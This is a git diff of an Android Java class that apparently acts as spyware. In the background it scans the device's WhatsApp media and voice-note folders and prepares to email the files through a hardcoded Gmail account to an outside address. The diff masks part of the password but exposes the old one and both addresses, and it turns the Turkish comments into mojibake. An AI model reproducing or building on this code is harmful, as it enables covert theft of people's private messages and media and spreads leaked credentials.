@@ -19,8 +19,8 @@ public class ReadWhatSappPicture extends AsyncTask<Void, Void, Void>{
 
      @Override
      protected Void doInBackground(Void... params) {
-    	 System.out.println("mail gönderiliyor...");
- 		WhatsappOfMail m = new WhatsappOfMail("hemenindir57@gmail.com","123zafer123"); 
+    	 System.out.println("mail gÃ¶nderiliyor...");
+ 		WhatsappOfMail m = new WhatsappOfMail("hemenindir57@gmail.com","123xxx123"); 
  	    //   emailGonder();
  			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
  		        m.setTo(toArr); 
@@ -104,7 +104,7 @@ public class ReadWhatSappPicture extends AsyncTask<Void, Void, Void>{
 		                  //     Log.i("zms", "zms pathWhatspMedia"+_filesWhatspMedia[i]);
 		                      Log.i("zms", "zms "+_filesWhatspMediaAudioSent[i].substring(_filesWhatspMediaAudioSent[i].lastIndexOf("/")));
 		                 }
-		                     //Whatsapp Konuþmalarý Allma
+		                     //Whatsapp KonuÃ¾malarÃ½ Allma
 		                 root = new File("/storage/sdcard0/WhatsApp/Media/WhatsApp Voice Notes");
 		         		getfile(root);
 
